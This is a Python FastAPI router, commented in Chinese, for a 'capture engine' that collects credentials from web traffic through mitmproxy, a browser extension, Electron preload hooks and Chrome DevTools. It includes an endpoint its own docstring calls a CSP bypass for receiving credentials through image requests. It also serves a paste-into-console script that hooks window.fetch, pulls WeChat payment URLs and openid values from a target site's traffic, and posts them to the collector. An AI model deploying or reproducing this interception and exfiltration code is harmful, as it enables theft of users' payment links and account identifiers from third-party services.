"""捕获引擎 API 路由 — 控制捕获生命周期 + 接收凭证。"""

from __future__ import annotations

import asyncio
import json
import logging
from typing import Any, Optional

from fastapi import APIRouter, HTTPException, Request
from fastapi.responses import Response, StreamingResponse
from pydantic import BaseModel

from capture import engine as capture_engine
from capture.cdp_engine import engine as cdp_engine
from storage.db import add_log, get_cursor

logger = logging.getLogger("agent-terminal.routers.capture")
router = APIRouter(prefix="/api/capture", tags=["capture"])


class IngestRequest(BaseModel):
    """接收来自采集渠道的原始数据。"""
    type: str = "raw_data"
    value: str = ""
    platform: str = "unknown"
    product: str = ""
    source: str = "unknown"
    host: str = ""
    path: str = ""
    url: str = ""
    origin: str = ""
    method: str = ""
    body: str = ""
    headers: dict = {}
    action: str = ""
    data: dict = {}
    captured_at: str = ""
    # web_save 专用字段（用于账号映射）
    openid: str = ""
    pay_method: str = ""
    product_id: str = ""
    response_body: str = ""


@router.post("/ingest")
async def ingest_credential(req: IngestRequest):
    """接收来自 mitmproxy / content.js / Electron preload 的采集数据。"""
    raw_data = req.model_dump()
    # 保留所有非空字段（包括 openid、pay_method 等）
    raw_data = {k: v for k, v in raw_data.items() if v is not None}

    if not raw_data.get("value"):
        return {"status": "skipped", "reason": "empty_value"}

    credential = await capture_engine.ingest(raw_data)
    if credential:
        return {
            "status": "accepted",
            "credential_id": credential.id,
            "type": credential.type.value,
        }
    return {"status": "skipped", "reason": "unrecognized"}


@router.post("/start")
async def start_capture():
    """启动捕获引擎（仅激活后端监听，不设系统代理）。"""
    # 确保系统代理已关闭（防止上次残留）
    try:
        import winreg, ctypes
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Internet Settings",
            0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(key, "ProxyEnable", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
        ctypes.windll.wininet.InternetSetOptionW(0, 39, 0, 0)
    except Exception:
        pass

    success = await capture_engine.start()
    if success:
        add_log("info", "system", "捕获引擎已启动")
        return {"status": "started"}
    raise HTTPException(status_code=500, detail="启动失败，请检查 mitmproxy 是否安装")


@router.post("/stop")
async def stop_capture():
    """停止捕获引擎。"""
    await capture_engine.stop()
    add_log("info", "system", "捕获引擎已停止")
    return {"status": "stopped"}


@router.post("/restart")
async def restart_capture():
    """重启捕获引擎。"""
    success = await capture_engine.restart()
    if success:
        add_log("info", "system", "捕获引擎已重启")
        return {"status": "restarted"}
    raise HTTPException(status_code=500, detail="重启失败")


@router.get("/status")
async def capture_status():
    """获取捕获引擎状态。"""
    return capture_engine.get_status()


@router.get("/pixel")
async def capture_pixel(data: str = ""):
    """CSP 绕过接收端点（通过 Image() GET 请求接收凭证）。"""
    import json, urllib.parse
    if data:
        try:
            raw = json.loads(urllib.parse.unquote(data))
            await capture_engine.ingest(raw)
        except Exception:
            pass
    return Response(status_code=204)  # 空响应，图片用


@router.get("/inject-script")
async def get_inject_script():
    """返回 F12 控制台注入脚本（用户复制后粘贴到目标页面控制台）。"""
    script = (
        "(function(){"
        "const B='http://localhost:8800/api/capture/ingest';"
        "const F=window.fetch;let n=0;"
        "window.fetch=async function(...a){"
        "const u=typeof a[0]==='string'?a[0]:a[0]?.url||'';"
        "const i=a[1]||{};"
        "if(u.includes('/v1/r/')&&u.includes('web_save')){"
        "const rb=i.body||'';"
        "const r=await F.apply(this,a);"
        "if(r.ok){const t=await r.clone().text();"
        "const p='weixin://wxpay/bizpayurl?pr=';"
        "const idx=t.indexOf(p);"
        "if(idx>=0){"
        "n++;"
        "let end=idx+80;"
        "for(let j=idx;j<idx+80;j++){const c=t[j];if(c===' '||c===','){end=j;break}}"
        "const url=t.substring(idx,end);"
        "const o=(rb.match(/openid=([A-F0-9]+)/)||[])[1]||'';"
        "console.log('[CAP] #'+n+' openid='+o.slice(0,8));"
        "fetch(B,{method:'POST',headers:{'Content-Type':'application/json'},"
        "body:JSON.stringify({type:'payment_url',value:url,"
        "source:'web_save',openid:o,pay_method:'wechat',"
        "body:rb.slice(0,3000)})}).catch(function(){})"
        "}}return r}"
        "return F.apply(this,a)}"
        "console.log('[CAP] ready')"
        "})();"
    )
    return {
        "script": script,
        "instructions": "1. 打开目标页面 → 2. F12 Console → 3. 粘贴脚本 → 4. 正常操作支付",
        "minified": script,
    }


@router.get("/sse")
async def capture_sse(request: Request):
    """SSE 端点 — 实时推送新捕获的凭证。"""
    queue: asyncio.Queue = asyncio.Queue()
    capture_engine.add_sse_queue(queue)

    async def event_generator():
        try:
            # 先发一条心跳
            yield f"data: {json.dumps({'type': 'connected'})}\n\n"
            while True:
                if await request.is_disconnected():
                    break
                try:
                    event = await asyncio.wait_for(queue.get(), timeout=30)
                    yield f"data: {json.dumps(event)}\n\n"
                except asyncio.TimeoutError:
                    yield f"data: {json.dumps({'type': 'heartbeat'})}\n\n"
        finally:
            capture_engine.remove_sse_queue(queue)

    return StreamingResponse(
        event_generator(),
        media_type="text/event-stream",
        headers={"Cache-Control": "no-cache", "Connection": "keep-alive"},
    )

# ═══════════════════════════════════════════════
# CDP 引擎路由
# ═══════════════════════════════════════════════


@router.post("/cdp/connect")
async def cdp_connect(port: int = 9222):
    from capture.cdp_engine import engine as cdp
    if await cdp.connect(port):
        return {"status": "connected", "port": port}
    proc = cdp.launch_chrome(port)
    if proc:
        import asyncio; await asyncio.sleep(3)
        if await cdp.connect(port):
            return {"status": "chrome_launched", "port": port}
    raise HTTPException(status_code=500, detail="连接失败")

@router.post("/cdp/disconnect")
async def cdp_disconnect():
    from capture.cdp_engine import engine as cdp
    await cdp.disconnect()
    return {"status": "disconnected"}

@router.get("/cdp/status")
async def cdp_status():
    from capture.cdp_engine import engine as cdp
    return {"connected": cdp.is_running}

@router.post("/cdp/collect")
async def cdp_collect(timeout: int = 120):
    from capture.cdp_engine import engine as cdp
    from capture import engine as capture_engine
    if not cdp.is_running:
        raise HTTPException(status_code=400, detail="CDP 未连接")
    cdp.set_callback(capture_engine.ingest)
    cred = await cdp.collect(timeout)
    if cred:
        from storage.db import add_log
        add_log("info", "cdp", f"OK")
        return {"status": "captured", "credential_id": cred.id}
    return {"status": "timeout"}
